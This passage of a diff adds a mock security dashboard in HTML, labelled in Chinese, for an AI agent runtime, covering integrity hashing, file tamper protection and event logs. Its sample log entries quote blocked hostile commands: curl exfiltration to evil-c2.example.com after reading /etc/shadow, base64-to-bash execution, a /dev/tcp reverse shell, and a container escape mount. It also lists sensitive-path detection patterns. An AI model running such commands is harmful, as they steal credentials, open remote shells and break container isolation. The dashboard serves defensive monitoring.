+        <div class="log-detail">operation: File | resource: /etc/shadow | action: Audit | severity: 8 | tags: MITRE_T1003</div>
+      </div>
+
+      <div class="log-entry" style="border-left:4px solid #ef4444">
+        <div class="log-header">
+          <span class="badge badge-high">HIGH</span>
+          <span class="badge badge-sys">ClawAegis</span>
+          <span class="log-time">2026-04-30 14:12:03.678</span>
+          <span class="log-id">EVT-20260430-0003</span>
+        </div>
+        <div class="log-body"><strong>异常外联</strong> — curl to unregistered domain (evil-c2.example.com)</div>
+        <div class="log-detail">source: exec tool | command: curl https://evil-c2.example.com/api/exfil | action: BLOCKED | reason: exfiltration-chain</div>
+        <div class="log-chain">
+          <span class="log-chain-step">read(/etc/shadow)</span><span class="log-chain-arrow">&rarr;</span>
+          <span class="log-chain-step">source:secret-reference</span><span class="log-chain-arrow">&rarr;</span>
+          <span class="log-chain-step">curl(outbound)</span><span class="log-chain-arrow">&rarr;</span>
+          <span class="log-chain-step" style="background:#fef2f2;color:#dc2626">BLOCKED</span>
+        </div>
+      </div>
+
+      <div class="log-entry" style="border-left:4px solid #f59e0b">
+        <div class="log-header">
+          <span class="badge badge-medium">MEDIUM</span>
+          <span class="badge badge-sys">ClawAegis</span>
+          <span class="log-time">2026-04-30 13:55:22.104</span>
+          <span class="log-id">EVT-20260430-0004</span>
+        </div>
+        <div class="log-body"><strong>可疑编码命令</strong> — base64 -d | bash</div>
+        <div class="log-detail">source: exec tool | command: echo dW5hbWUgLWE= | base64 -d | bash | matched: base64-pipe-exec | action: BLOCKED</div>
+      </div>
+
+      <div class="log-entry" style="border-left:4px solid #3b82f6">
+        <div class="log-header">
+          <span class="badge badge-low">LOW</span>
+          <span class="badge badge-sys">KubeArmor</span>
+          <span class="log-time">2026-04-30 13:40:08.556</span>
+          <span class="log-id">EVT-20260430-0005</span>
+        </div>
+        <div class="log-body"><strong>网络扫描探测</strong> — nmap syn scan detected (src: 10.0.1.55)</div>
+        <div class="log-detail">operation: Network | protocol: TCP | src: 10.0.1.55:54321 | dst: 10.0.0.1:443 | action: Audit</div>
+      </div>
+    </div>
+
+  </div>
+</div>
+
+<!-- ═══════════════════════════════════════════════════ -->
+<!-- PAGE 5: FR-32 可信启动与关键组件完整性度量           -->
+<!-- ═══════════════════════════════════════════════════ -->
+<div class="page-section" id="page-fr32">
+  <div class="subheader">
+    <span>FR-32</span><span style="opacity:.3">|</span>
+    <strong>可信启动与关键组件完整性度量</strong>
+    <span style="opacity:.3">|</span>
+    <span class="badge badge-p1">P1 优先级</span>
+  </div>
+  <div class="content-area">
+
+    <div class="tabs" data-tabgroup="fr32">
+      <div class="tab active" data-tab="fr32-config">完整性配置</div>
+      <div class="tab" data-tab="fr32-manifest">度量清单</div>
+      <div class="tab" data-tab="fr32-ima">IMA度量</div>
+      <div class="tab" data-tab="fr32-verify">校验记录</div>
+    </div>
+
+    <!-- ── Tab: 完整性配置 ── -->
+    <div class="tab-content active" id="fr32-config">
+
+      <div class="section-title">KubeArmor IMA 配置</div>
+      <div class="app-panel mb-16">
+        <div class="toggle-row">
+          <div><strong>enableIMA</strong><div class="form-hint">启用 IMA 文件完整性哈希度量 (需 BPF LSM 支持)</div></div>
+          <div class="toggle-switch" id="toggle-ima"></div>
+        </div>
+        <div class="mt-12">
+          <div class="form-hint">LSM hook: <code>bpf_file_ima_hash</code> (<code>ImaBprmCheckSecurity</code>)</div>
+          <div class="form-hint mt-8">Hash fields: <code>ProcessHash</code>, <code>ParentHash</code>, <code>ResourceHash</code>, <code>HashAlgo</code></div>
+        </div>
+      </div>
+
+      <div class="section-title mt-20">ClawManager Config Revision SHA256</div>
+      <div class="app-panel mb-16">
+        <div class="form-group">
+          <div class="form-label">Checksum 格式</div>
+          <code style="background:#f5f0eb;padding:6px 12px;border-radius:6px;display:block;margin-top:4px">sha256:&lt;64-hex-chars&gt;</code>
+        </div>
+        <div class="sub-title">InstanceConfigRevision 模型</div>
+        <table class="data-table">
+          <thead><tr><th>字段</th><th>类型</th><th>说明</th></tr></thead>
+          <tbody>
+            <tr><td><code>id</code></td><td>int (PK)</td><td>自增主键</td></tr>
+            <tr><td><code>instance_id</code></td><td>int</td><td>关联实例ID</td></tr>
+            <tr><td><code>revision_no</code></td><td>int</td><td>配置版本号</td></tr>
+            <tr><td><code>content_json</code></td><td>string</td><td>配置内容 (JSON)</td></tr>
+            <tr><td><code>checksum</code></td><td>string</td><td>SHA-256 校验和</td></tr>
+            <tr><td><code>status</code></td><td>string</td><td>状态 (activated/superseded)</td></tr>
+            <tr><td><code>published_by</code></td><td>*int</td><td>发布者ID</td></tr>
+            <tr><td><code>published_at</code></td><td>*time</td><td>发布时间</td></tr>
+            <tr><td><code>activated_at</code></td><td>*time</td><td>激活时间</td></tr>
+          </tbody>
+        </table>
+      </div>
+
+      <div class="section-title mt-20">ClawAegis Self-Integrity (启动时计算)</div>
+      <div class="app-panel mb-16">
+        <div class="panel-eyebrow">SELF_INTEGRITY_FILES — 启动时计算 SHA-256 指纹并持久化至 self-integrity.json</div>
+        <div class="grid-2 mt-8">
+          <div>
+            <div class="text-xs" style="font-weight:600;margin-bottom:6px;color:var(--text-h)">核心文件</div>
+            <div class="text-xs" style="line-height:2">
+              index.ts<br>
+              runtime-api.ts<br>
+              openclaw.plugin.json<br>
+              package.json
+            </div>
+          </div>
+          <div>
+            <div class="text-xs" style="font-weight:600;margin-bottom:6px;color:var(--text-h)">安全模块</div>
+            <div class="text-xs" style="line-height:2">
+              src/config.ts<br>
+              src/types.ts<br>
+              src/state.ts<br>
+              src/rules.ts
+            </div>
+          </div>
+          <div>
+            <div class="text-xs" style="font-weight:600;margin-bottom:6px;color:var(--text-h)">扫描与处理</div>
+            <div class="text-xs" style="line-height:2">
+              src/scan-service.ts<br>
+              src/scan-worker.ts<br>
+              src/scan-worker.js<br>
+              src/handlers.ts
+            </div>
+          </div>
+          <div>
+            <div class="text-xs" style="font-weight:600;margin-bottom:6px;color:var(--text-h)">指纹示例</div>
+            <div class="code-block" style="font-size:.7rem;padding:8px 12px">{
+  "index.ts": "a1b2c3d4e5f6a7b8...",
+  "src/rules.ts": "f8e7d6c5b4a39281...",
+  "src/handlers.ts": "1a2b3c4d5e6f7a8b..."
+}</div>
+          </div>
+        </div>
+      </div>
+
+      <div class="section-title mt-20">KSecure: IMA 状态</div>
+      <div class="app-panel" style="border:1px dashed #d97706">
+        <div class="flex items-center gap-8 mb-8">
+          <span class="badge badge-observe">待实现</span>
+          <strong style="color:var(--text-h)">IMA 度量尚未实现</strong>
+        </div>
+        <div class="text-sm">建议内核参数: <code style="background:#f5f0eb;padding:4px 8px;border-radius:4px">lsm=integrity,selinux,smack,tomoyo,apparmor,bpf</code></div>
+        <div class="form-hint mt-8">需启用 integrity LSM 以支持 IMA 度量策略</div>
+      </div>
+    </div>
+
+    <!-- ── Tab: 度量清单 ── -->
+    <div class="tab-content" id="fr32-manifest">
+      <div class="section-title">关键对象度量清单</div>
+      <div class="app-panel">
+        <div class="overflow-x">
+          <table class="data-table">
+            <thead><tr><th>对象</th><th>路径</th><th>哈希算法</th><th>当前哈希</th><th>状态</th></tr></thead>
+            <tbody>
+              <tr><td><strong>容器运行时</strong></td><td><code>/usr/bin/containerd</code></td><td>SHA-256</td><td><code>sha256:a1b2c3d4...</code></td><td><span class="badge badge-green">✓ 匹配</span></td></tr>
+              <tr><td></td><td><code>/usr/bin/containerd-shim*</code></td><td>SHA-256</td><td><code>sha256:e5f6a7b8...</code></td><td><span class="badge badge-green">✓ 匹配</span></td></tr>
+              <tr><td></td><td><code>/usr/bin/runc</code></td><td>SHA-256</td><td><code>sha256:d4e5f6a7...</code></td><td><span class="badge badge-green">✓ 匹配</span></td></tr>
+              <tr><td><strong>K8s 组件</strong></td><td><code>/usr/bin/kubelet</code></td><td>SHA-256</td><td><code>sha256:a1b2c3d4...</code></td><td><span class="badge badge-green">✓ 匹配</span></td></tr>
+              <tr><td></td><td><code>/usr/bin/kube-apiserver</code></td><td>SHA-256</td><td><code>sha256:b2c3d4e5...</code></td><td><span class="badge badge-green">✓ 匹配</span></td></tr>
+              <tr><td></td><td><code>/usr/bin/kube-controller-manager</code></td><td>SHA-256</td><td><code>sha256:c3d4e5f6...</code></td><td><span class="badge badge-green">✓ 匹配</span></td></tr>
+              <tr><td></td><td><code>/usr/bin/kube-scheduler</code></td><td>SHA-256</td><td><code>sha256:d4e5f6a7...</code></td><td><span class="badge badge-green">✓ 匹配</span></td></tr>
+              <tr><td><strong>KubeArmor</strong></td><td><code>/usr/bin/kubearmor</code></td><td>SHA-256</td><td><code>sha256:abc123de...</code></td><td><span class="badge" style="background:#fef2f2;color:#dc2626">✗ 不匹配</span></td></tr>
+              <tr><td></td><td>BPF object files</td><td>SHA-256</td><td><code>sha256:f1e2d3c4...</code></td><td><span class="badge badge-green">✓ 匹配</span></td></tr>
+              <tr><td><strong>KSecure</strong></td><td><code>/opt/KSec/bin/KSecMain</code></td><td>SHA-256</td><td><code>sha256:789abcde...</code></td><td><span class="badge badge-green">✓ 匹配</span></td></tr>
+              <tr><td><strong>ClawManager</strong></td><td>server binary</td><td>SHA-256</td><td><code>sha256:1a2b3c4d...</code></td><td><span class="badge badge-green">✓ 匹配</span></td></tr>
+              <tr><td></td><td>frontend assets</td><td>SHA-256</td><td><code>sha256:5e6f7a8b...</code></td><td><span class="badge badge-green">✓ 匹配</span></td></tr>
+              <tr><td><strong>OpenClaw</strong></td><td>core runtime files</td><td>SHA-256</td><td><code>sha256:9a0b1c2d...</code></td><td><span class="badge badge-green">✓ 匹配</span></td></tr>
+            </tbody>
+          </table>
+        </div>
+      </div>
+    </div>
+
+    <!-- ── Tab: IMA度量 ── -->
+    <div class="tab-content" id="fr32-ima">
+      <div class="section-title">KubeArmor IMA 可见性</div>
+      <div class="app-panel mb-16">
+        <div class="panel-title mb-8">Per-Namespace IMA 可见性</div>
+        <div class="text-sm mb-8">IMA 可见性通过 eBPF map 索引 <code>5</code> 设置，对应 Visibility 结构体中 <code>IMA bool</code> 字段。</div>
+        <div class="text-sm">当 <code>ctx.Hash == 1</code> 时，日志中包含 IMA 哈希数据。</div>
+      </div>
+
+      <div class="section-title mt-20">IMA 日志条目示例</div>
+      <div class="app-panel">
+        <div class="code-block">{
+  <span class="str">"timestamp"</span>: <span class="num">1746000000</span>,
+  <span class="str">"updatedTime"</span>: <span class="str">"2026-04-30T08:00:00.000Z"</span>,
+  <span class="str">"hostName"</span>: <span class="str">"node-01"</span>,
+  <span class="str">"namespaceName"</span>: <span class="str">"production"</span>,
+  <span class="str">"podName"</span>: <span class="str">"api-server-7d9f8c6b4-x2kjl"</span>,
+  <span class="str">"containerName"</span>: <span class="str">"api-server"</span>,
+  <span class="str">"processName"</span>: <span class="str">"/usr/bin/kubelet"</span>,
+  <span class="str">"parentProcessName"</span>: <span class="str">"/usr/lib/systemd/systemd"</span>,
+  <span class="str">"type"</span>: <span class="str">"ContainerLog"</span>,
+  <span class="str">"source"</span>: <span class="str">"/usr/bin/kubelet"</span>,
+  <span class="str">"operation"</span>: <span class="str">"Process"</span>,
+  <span class="str">"resource"</span>: <span class="str">"/usr/bin/kubelet"</span>,
+  <span class="str">"action"</span>: <span class="str">"Allow"</span>,
+  <span class="cm">/* IMA hash fields */</span>
+  <span class="str">"ProcessHash"</span>: <span class="str">"a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6..."</span>,
+  <span class="str">"ParentHash"</span>: <span class="str">"f1e2d3c4b5a6978869708192a3b4c5d6..."</span>,
+  <span class="str">"ResourceHash"</span>: <span class="str">"1a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d..."</span>,
+  <span class="str">"HashAlgo"</span>: <span class="str">"sha256"</span>
+}</div>
+      </div>
+    </div>
+
+    <!-- ── Tab: 校验记录 ── -->
+    <div class="tab-content" id="fr32-verify">
+      <div class="section-title">完整性校验记录</div>
+
+      <div class="log-entry" style="border-left:4px solid #059669">
+        <div class="log-header">
+          <span class="badge badge-green">VERIFIED</span>
+          <span class="log-time">2026-04-30 08:00:01</span>
+        </div>
+        <div class="log-body">kubelet hash verified ✓</div>
+        <div class="log-detail">sha256:a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2</div>
+      </div>
+
+      <div class="log-entry" style="border-left:4px solid #059669">
+        <div class="log-header">
+          <span class="badge badge-green">VERIFIED</span>
+          <span class="log-time">2026-04-30 08:00:01</span>
+        </div>
+        <div class="log-body">runc hash verified ✓</div>
+        <div class="log-detail">sha256:d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4</div>
+      </div>
+
+      <div class="log-entry" style="border-left:4px solid #dc2626">
+        <div class="log-header">
+          <span class="badge badge-blocked">MISMATCH</span>
+          <span class="log-time">2026-04-30 08:00:02</span>
+        </div>
+        <div class="log-body">kubearmor hash MISMATCH ✗</div>
+        <div class="log-detail">expected: sha256:abc123de4567...<br>actual:&nbsp;&nbsp; sha256:def456789012...</div>
+      </div>
+
+      <div class="log-entry" style="border-left:4px solid #059669">
+        <div class="log-header">
+          <span class="badge badge-green">VERIFIED</span>
+          <span class="log-time">2026-04-30 08:00:02</span>
+        </div>
+        <div class="log-body">KSecMain hash verified ✓</div>
+        <div class="log-detail">sha256:789abcdef0123456789abcdef0123456789abcdef0123456789abcdef012345</div>
+      </div>
+
+      <div class="log-entry" style="border-left:4px solid #059669">
+        <div class="log-header">
+          <span class="badge badge-green">VERIFIED</span>
+          <span class="log-time">2026-04-30 08:00:03</span>
+        </div>
+        <div class="log-body">ClawAegis self-integrity verified ✓ (12 files, all match)</div>
+        <div class="log-detail">index.ts: a1b2c3d4... | runtime-api.ts: e5f6a7b8... | src/rules.ts: f8e7d6c5... | src/handlers.ts: 1a2b3c4d...</div>
+      </div>
+    </div>
+
+  </div>
+</div>
+
+<!-- ═══════════════════════════════════════════════════ -->
+<!-- PAGE 6: FR-33 关键文件与配置防篡改                   -->
+<!-- ═══════════════════════════════════════════════════ -->
+<div class="page-section" id="page-fr33">
+  <div class="subheader">
+    <span>FR-33</span><span style="opacity:.3">|</span>
+    <strong>关键文件与配置防篡改</strong>
+    <span style="opacity:.3">|</span>
+    <span class="badge badge-p1">P1 优先级</span>
+  </div>
+  <div class="content-area">
+
+    <div class="tabs" data-tabgroup="fr33">
+      <div class="tab active" data-tab="fr33-paths">保护路径</div>
+      <div class="tab" data-tab="fr33-policy">文件完整性策略</div>
+      <div class="tab" data-tab="fr33-tracking">变更追踪</div>
+      <div class="tab" data-tab="fr33-log">防篡改日志</div>
+    </div>
+
+    <!-- ── Tab: 保护路径 ── -->
+    <div class="tab-content active" id="fr33-paths">
+      <div class="section-title">ClawAegis 受保护路径配置</div>
+      <div class="app-panel mb-16">
+        <table class="data-table">
+          <thead><tr><th>配置项</th><th>类型</th><th>默认值</th><th>说明</th></tr></thead>
+          <tbody>
+            <tr><td><code>protectedPaths</code></td><td>string[]</td><td><code>[]</code></td><td>额外受保护的绝对路径</td></tr>
+            <tr><td><code>protectedSkills</code></td><td>string[]</td><td><code>[]</code></td><td>受保护的 skill ID</td></tr>
+            <tr><td><code>protectedPlugins</code></td><td>string[]</td><td><code>[]</code></td><td>受保护的 plugin ID</td></tr>
+            <tr><td><code>extraProtectedRoots</code></td><td>string[]</td><td><code>[]</code></td><td>遗留兼容别名 (同 protectedPaths)</td></tr>
+          </tbody>
+        </table>
+      </div>
+
+      <div class="section-title mt-20">resolveProtectedRoots 解析结果</div>
+      <div class="app-panel mb-16">
+        <table class="data-table">
+          <thead><tr><th>#</th><th>来源</th><th>解析路径</th></tr></thead>
+          <tbody>
+            <tr><td>1</td><td>api.rootDir</td><td><code>~/.openclaw/extensions/claw-aegis/</code></td></tr>
+            <tr><td>2</td><td>stateDir</td><td><code>~/.openclaw/state/plugins/claw-aegis/</code></td></tr>
+            <tr><td>3</td><td>protectedPaths[]</td><td>用户自定义路径</td></tr>
+            <tr><td>4</td><td>protectedSkill → ~/.openclaw/skills/{id}</td><td><code>~/.openclaw/skills/{skillId}/</code></td></tr>
+            <tr><td></td><td>protectedSkill → workspace/skills/{id}</td><td><code>~/.openclaw/workspace/skills/{skillId}/</code></td></tr>
+            <tr><td>5</td><td>protectedPlugin → extensions/{id}</td><td><code>~/.openclaw/extensions/{pluginId}/</code></td></tr>
+            <tr><td></td><td>protectedPlugin → plugins/{id}</td><td><code>~/.openclaw/plugins/{pluginId}/</code></td></tr>
+          </tbody>
+        </table>
+      </div>
+
+      <div class="section-title mt-20">内置敏感路径模式</div>
+      <div class="app-panel mb-16">
+        <div class="tag-list">
+          <span class="tag">.ssh/</span>
+          <span class="tag">.antconfig/</span>
+          <span class="tag">.openclaw/openclaw.json</span>
+          <span class="tag">.openclaw/extensions/claw-aegis/</span>
+          <span class="tag">.bashrc</span>
+          <span class="tag">.zshrc</span>
+          <span class="tag">.bash_profile</span>
+          <span class="tag">.zprofile</span>
+          <span class="tag">.profile</span>
+          <span class="tag">.bash_login</span>
+          <span class="tag">.zshenv</span>
+        </div>
+      </div>
+
+      <div class="section-title mt-20">KubeArmor FIM 策略 (readOnly recursive)</div>
+      <div class="app-panel mb-16">
+        <div class="tag-list mb-8">
+          <span class="tag">/bin/</span>
+          <span class="tag">/boot/</span>
+          <span class="tag">/sbin/</span>
+          <span class="tag">/usr/bin/</span>
+          <span class="tag">/usr/lib/</span>
+          <span class="tag">/usr/sbin/</span>
+        </div>
+        <div class="tag-list">
+          <span class="tag mitre">MITRE_T1036</span>
+          <span class="tag mitre">MITRE_T1565</span>
+          <span class="tag nist">NIST_800-53_AU-2</span>
+          <span class="tag nist">NIST_800-53_SI-4</span>
+        </div>
+      </div>
+
+      <div class="section-title mt-20">KubeArmor 额外加固策略</div>
+      <div class="app-panel">
+        <table class="data-table">
+          <thead><tr><th>策略名</th><th>保护路径</th><th>动作</th><th>标签</th></tr></thead>
+          <tbody>
+            <tr><td><code>harden-write-etc-dir</code></td><td>/etc/ (readOnly, recursive)</td><td><span class="badge badge-enforce">Block</span></td><td><span class="tag mitre">MITRE_T1036.005</span> <span class="tag mitre">MITRE_T1562.001</span> <span class="tag nist">NIST_SI-7</span></td></tr>
+            <tr><td><code>harden-trusted-cert-mod</code></td><td>/etc/pki/, /etc/ssl/, /usr/local/share/ca-certificates/</td><td><span class="badge badge-enforce">Block</span></td><td><span class="tag mitre">MITRE_T1552</span></td></tr>
+            <tr><td><code>harden-cronjob-cfg</code></td><td>/etc/cron.d/, /etc/cron.daily/, /var/spool/cron/</td><td><span class="badge badge-observe">Audit</span></td><td><span class="tag cis">CIS_5.1</span> <span class="tag nist">NIST_SI-4</span></td></tr>
+            <tr><td><code>harden-impair-defense</code></td><td>/etc/apparmor.d/, /etc/sysconfig/selinux/</td><td><span class="badge badge-observe">Audit</span></td><td><span class="tag mitre">MITRE_T1562</span></td></tr>
+          </tbody>
+        </table>
+      </div>
+    </div>
+
+    <!-- ── Tab: 文件完整性策略 ── -->
+    <div class="tab-content" id="fr33-policy">
+      <div class="section-title">KubeArmor FilePathType 结构</div>
+      <div class="app-panel mb-16">
+        <table class="data-table">
+          <thead><tr><th>字段</th><th>类型</th><th>说明</th></tr></thead>
+          <tbody>
+            <tr><td><code>path</code></td><td>string</td><td>目标文件路径</td></tr>
+            <tr><td><code>readOnly</code></td><td>bool</td><td>只读保护</td></tr>
+            <tr><td><code>ownerOnly</code></td><td>bool</td><td>仅限文件所有者</td></tr>
+            <tr><td><code>fromSource</code></td><td>[]MatchSourceType</td><td>来源进程限制</td></tr>
+            <tr><td><code>severity</code></td><td>int</td><td>严重级别</td></tr>
+            <tr><td><code>tags</code></td><td>[]string</td><td>合规标签</td></tr>
+            <tr><td><code>message</code></td><td>string</td><td>告警消息</td></tr>
+            <tr><td><code>action</code></td><td>string</td><td>Allow / Block / Audit</td></tr>
+          </tbody>
+        </table>
+      </div>
+
+      <div class="section-title mt-20">KubeArmor AppArmor ReadOnly 执行</div>
+      <div class="app-panel mb-16">
+        <div class="code-block"><span class="cm"># AppArmor ReadOnly enforcement for protected path</span>
+<span class="kw">Allow</span>: owner <span class="str">$path</span> klr,    <span class="cm"># read+lock</span>
+<span class="kw">Deny</span>:&nbsp;  deny <span class="str">$path</span> klw,     <span class="cm"># deny write</span></div>
+      </div>
+
+      <div class="section-title mt-20">KSecure FilePreType 结构</div>
+      <div class="app-panel mb-16">
+        <div class="code-block"><span class="kw">type</span> FilePreType <span class="kw">struct</span> {
+  Switch <span class="kw">bool</span>   <span class="str">`json:"switch-on"`</span>
+  Paths  []Path <span class="str">`json:"rules,omitempty"`</span>
+}
+
+<span class="kw">type</span> Path <span class="kw">struct</span> {
+  Path   <span class="kw">string</span> <span class="str">`json:"path"`</span>
+  Mode   <span class="kw">string</span> <span class="str">`json:"mode,omitempty"`</span>
+  Desc   <span class="kw">string</span> <span class="str">`json:"desc,omitempty"`</span>
+  Action <span class="kw">string</span> <span class="str">`json:"action,omitempty"`</span>
+}</div>
+      </div>
+
+      <div class="section-title mt-20">KSecure 默认白名单</div>
+      <div class="app-panel mb-16">
+        <div class="sub-title">whiteListDefault (始终允许)</div>
+        <div class="tag-list mb-8">
+          <span class="tag">/opt/KSec/bin/KSecMain</span>
+          <span class="tag">/usr/bin/userdel</span>
+          <span class="tag">/usr/libexec/gvfsd-trash</span>
+        </div>
+        <div class="sub-title">releaseAppForFileOpen (文件操作释放)</div>
+        <div class="tag-list">
+          <span class="tag">/usr/bin/mv</span>
+          <span class="tag">/usr/bin/cp</span>
+        </div>
+      </div>
+
+      <div class="section-title mt-20">ClawAegis Self Protection 文本违规检测</div>
+      <div class="app-panel">
+        <table class="data-table">
+          <thead><tr><th>#</th><th>检测类别</th><th>匹配逻辑</th><th>动作</th></tr></thead>
+          <tbody>
+            <tr><td>1</td><td>ClawAegis 引用 + 自保护动作</td><td>mentionsClawAegisReference &amp;&amp; hasSelfProtectionAction</td><td><span class="badge badge-blocked">BLOCK</span></td></tr>
+            <tr><td>2</td><td>配置篡改模式 + 变更工具</td><td>matchesClawAegisConfigTamper &amp;&amp; (mutation/query tool || openclaw.json path)</td><td><span class="badge badge-blocked">BLOCK</span></td></tr>
+            <tr><td>3</td><td>敏感路径目标引用</td><td>mentionsSensitivePathTarget &amp;&amp; hasSensitivePathOperation</td><td><span class="badge badge-blocked">BLOCK</span></td></tr>
+            <tr><td>4</td><td>受保护 Skill ID + 变更动作</td><td>mentionsProtectedSkillTarget &amp;&amp; hasMutationOrDeleteAction</td><td><span class="badge badge-blocked">BLOCK</span></td></tr>
+            <tr><td>5</td><td>受保护 Plugin ID + 变更动作</td><td>mentionsProtectedPluginTarget &amp;&amp; hasMutationOrDeleteAction</td><td><span class="badge badge-blocked">BLOCK</span></td></tr>
+          </tbody>
+        </table>
+      </div>
+    </div>
+
+    <!-- ── Tab: 变更追踪 ── -->
+    <div class="tab-content" id="fr33-tracking">
+      <div class="section-title">ClawManager InstanceConfigRevision 历史</div>
+      <div class="app-panel mb-16">
+        <table class="data-table">
+          <thead><tr><th>Revision</th><th>Instance</th><th>Checksum</th><th>Published By</th><th>Published At</th><th>Status</th></tr></thead>
+          <tbody>
+            <tr><td><code>rev-003</code></td><td>inst-001</td><td><code>sha256:f8a3b2c1d4e5...</code></td><td>admin</td><td>2026-04-30 10:00</td><td><span class="badge badge-green">activated</span></td></tr>
+            <tr><td><code>rev-002</code></td><td>inst-001</td><td><code>sha256:7c1d9e8f0a2b...</code></td><td>admin</td><td>2026-04-29 14:30</td><td><span class="badge badge-info">superseded</span></td></tr>
+            <tr><td><code>rev-001</code></td><td>inst-001</td><td><code>sha256:a4e5c6d7f8g9...</code></td><td>admin</td><td>2026-04-28 09:00</td><td><span class="badge badge-info">superseded</span></td></tr>
+          </tbody>
+        </table>
+      </div>
+
+      <div class="section-title mt-20">InstanceDesiredState 追踪</div>
+      <div class="app-panel mb-16">
+        <table class="data-table">
+          <thead><tr><th>字段</th><th>类型</th><th>说明</th></tr></thead>
+          <tbody>
+            <tr><td><code>desiredPowerState</code></td><td>string</td><td><span class="badge badge-green">running</span> | <span class="badge badge-info">stopped</span></td></tr>
+            <tr><td><code>desiredConfigRevisionID</code></td><td>*int</td><td>目标配置版本ID</td></tr>
+            <tr><td><code>desiredRuntimeAction</code></td><td>*string</td><td>期望运行时动作</td></tr>
+          </tbody>
+        </table>
+      </div>
+
+      <div class="section-title mt-20">KSecure 回滚数据</div>
+      <div class="app-panel">
+        <div class="panel-title mb-8">回滚路径: /opt/KSec/compliance/rollback/</div>
+        <div class="tag-list">
+          <span class="tag">etc-shadow</span>
+          <span class="tag">etc-gshadow</span>
+          <span class="tag">etc-sshd</span>
+        </div>
+        <div class="form-hint mt-8">关键系统文件备份，用于检测到篡改时快速回滚</div>
+      </div>
+    </div>
+
+    <!-- ── Tab: 防篡改日志 ── -->
+    <div class="tab-content" id="fr33-log">
+      <div class="section-title">防篡改日志</div>
+
+      <div class="log-entry" style="border-left:4px solid #7f1d1d">
+        <div class="log-header">
+          <span class="badge badge-blocked">BLOCKED</span>
+          <span class="badge badge-sys">KubeArmor</span>
+          <span class="log-time">2026-04-30 15:01:22.456</span>
+          <span class="log-id">FR33-001</span>
+        </div>
+        <div class="log-body">写入 <code>/bin/ls</code> — KubeArmor FIM policy (readOnly)</div>
+        <div class="log-detail">policy: harden-file-integrity-monitoring | operation: File | resource: /bin/ls | action: Block | severity: 1 | tags: MITRE_T1036, MITRE_T1565, NIST_AU-2, NIST_SI-4</div>
+        <div class="log-chain">
+          <span class="log-chain-step">进程尝试写入</span><span class="log-chain-arrow">&rarr;</span>
+          <span class="log-chain-step">/bin/ls</span><span class="log-chain-arrow">&rarr;</span>
+          <span class="log-chain-step">FIM readOnly</span><span class="log-chain-arrow">&rarr;</span>
+          <span class="log-chain-step" style="background:#fef2f2;color:#dc2626">BLOCKED</span>
+        </div>
+      </div>
+
+      <div class="log-entry" style="border-left:4px solid #7f1d1d">
+        <div class="log-header">
+          <span class="badge badge-blocked">BLOCKED</span>
+          <span class="badge badge-sys">KSecure</span>
+          <span class="log-time">2026-04-30 14:47:33.891</span>
+          <span class="log-id">FR33-002</span>
+        </div>
+        <div class="log-body">修改 <code>/etc/shadow</code> 权限 — KSecure FilePreType</div>
+        <div class="log-detail">mode: chmod | path: /etc/shadow | action: Block | desc: 禁止修改系统密码文件权限</div>
+      </div>
+
+      <div class="log-entry" style="border-left:4px solid #f59e0b">
+        <div class="log-header">
+          <span class="badge badge-observed">DETECTED</span>
+          <span class="badge badge-sys">ClawAegis</span>
+          <span class="log-time">2026-04-30 14:35:18.234</span>
+          <span class="log-id">FR33-003</span>
+        </div>
+        <div class="log-body">修改 ClawAegis config — Self Protection guard</div>
+        <div class="log-detail">tool: edit | path: ~/.openclaw/extensions/claw-aegis/src/config.ts | matched: claw-aegis reference + mutation action | mode: enforce | action: BLOCKED</div>
+        <div class="log-chain">
+          <span class="log-chain-step">edit tool</span><span class="log-chain-arrow">&rarr;</span>
+          <span class="log-chain-step">claw-aegis reference</span><span class="log-chain-arrow">&rarr;</span>
+          <span class="log-chain-step">mutation action</span><span class="log-chain-arrow">&rarr;</span>
+          <span class="log-chain-step" style="background:#fef2f2;color:#dc2626">BLOCKED</span>
+        </div>
+      </div>
+
+      <div class="log-entry" style="border-left:4px solid #3b82f6">
+        <div class="log-header">
+          <span class="badge badge-allowed">OBSERVED</span>
+          <span class="badge badge-sys">KubeArmor</span>
+          <span class="log-time">2026-04-30 14:22:05.112</span>
+          <span class="log-id">FR33-004</span>
+        </div>
+        <div class="log-body">读取 <code>/proc/1234/environ</code> — KubeArmor protectEnv 预设</div>
+        <div class="log-detail">preset: protectEnv | operation: File | resource: /proc/1234/environ | action: Audit | container: api-server</div>
+      </div>
+    </div>
+
+  </div>
+</div>
+
+<!-- ═══════════════════════════════════════════════════ -->
+<!-- PAGE 7: 运行环境日志                                -->
+<!-- ═══════════════════════════════════════════════════ -->
+<div class="page-section" id="page-logs">
+  <div class="subheader">
+    <strong>运行环境安全日志</strong>
+  </div>
+  <div class="content-area">
+    <div class="section-title">FR-28 ~ FR-33 运行环境安全事件</div>
+
+    <div class="log-entry" style="border-left:4px solid #7f1d1d">
+      <div class="log-header">
+        <span class="badge badge-critical">CRITICAL</span>
+        <span class="badge badge-p0">FR-31</span>
+        <span class="badge badge-sys">ClawAegis</span>
+        <span class="log-time">2026-04-30 14:23:17</span>
+      </div>
+      <div class="log-body"><strong>反弹Shell检测</strong> — bash -i &gt;&amp; /dev/tcp/10.0.0.99/4444</div>
+      <div class="log-chain">
+        <span class="log-chain-step">exec(bash -i...)</span><span class="log-chain-arrow">&rarr;</span>
+        <span class="log-chain-step">HIGH_RISK_COMMAND</span><span class="log-chain-arrow">&rarr;</span>
+        <span class="log-chain-step" style="background:#fef2f2;color:#dc2626">BLOCKED</span>
+      </div>
+    </div>
+
+    <div class="log-entry" style="border-left:4px solid #ef4444">
+      <div class="log-header">
+        <span class="badge badge-high">HIGH</span>
+        <span class="badge badge-p0">FR-29</span>
+        <span class="badge badge-sys">KubeArmor</span>
+        <span class="log-time">2026-04-30 14:18:45</span>
+      </div>
+      <div class="log-body"><strong>容器逃逸尝试</strong> — 特权容器执行 mount /dev/sda1 /host</div>
+      <div class="log-detail">operation: Syscall | syscall: mount | source: privileged-container | action: Block</div>
+      <div class="log-chain">
+        <span class="log-chain-step">特权容器</span><span class="log-chain-arrow">&rarr;</span>
+        <span class="log-chain-step">mount syscall</span><span class="log-chain-arrow">&rarr;</span>
+        <span class="log-chain-step" style="background:#fef2f2;color:#dc2626">BLOCKED</span>
+      </div>
+    </div>
+
